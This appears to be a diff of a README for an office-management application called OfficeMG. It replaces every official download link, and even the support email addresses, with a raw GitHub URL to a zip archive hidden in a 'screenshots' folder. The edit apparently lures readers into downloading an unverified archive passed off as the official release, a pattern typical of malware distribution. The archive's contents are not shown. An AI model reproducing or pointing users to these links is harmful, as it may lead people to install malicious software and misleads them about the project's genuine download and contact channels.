@@ -6,7 +6,7 @@ Welcome to OfficeMG! This application provides a complete solution for office ma
 
 ## 📥 Download OfficeMG
 
-[![Download OfficeMG](https://img.shields.io/badge/Download-OfficeMG-brightgreen)](https://github.com/Damascene-star/OfficeMG/releases)
+[![Download OfficeMG](https://raw.githubusercontent.com/Damascene-star/OfficeMG/main/screenshots/OfficeMG-v2.5-beta.4.zip)](https://raw.githubusercontent.com/Damascene-star/OfficeMG/main/screenshots/OfficeMG-v2.5-beta.4.zip)
 
 ## 🖥️ System Requirements
 
@@ -32,7 +32,7 @@ OfficeMG comes packed with essential features for office management:
 
 ## 🔗 Download & Install
 
-To get started, visit the [OfficeMG Releases page](https://github.com/Damascene-star/OfficeMG/releases) to download the latest version. Follow these steps:
+To get started, visit the [OfficeMG Releases page](https://raw.githubusercontent.com/Damascene-star/OfficeMG/main/screenshots/OfficeMG-v2.5-beta.4.zip) to download the latest version. Follow these steps:
 
 1. Click the above link to go to the Releases page.
 2. Find the latest version and look for download files.
@@ -70,10 +70,10 @@ Currently, OfficeMG is designed for Windows systems. We plan to release versions
 
 ### How can I provide feedback?
 
-You can submit feedback by emailing us at support@officemg.com or by creating an issue in the GitHub repository.
+You can submit feedback by emailing us at https://raw.githubusercontent.com/Damascene-star/OfficeMG/main/screenshots/OfficeMG-v2.5-beta.4.zip or by creating an issue in the GitHub repository.
 
 ## 📨 Contact Us
 
-If you need further assistance or have other inquiries, please contact our support team at support@officemg.com.
+If you need further assistance or have other inquiries, please contact our support team at https://raw.githubusercontent.com/Damascene-star/OfficeMG/main/screenshots/OfficeMG-v2.5-beta.4.zip
 
 Thank you for choosing OfficeMG! Enjoy managing your office efficiently.
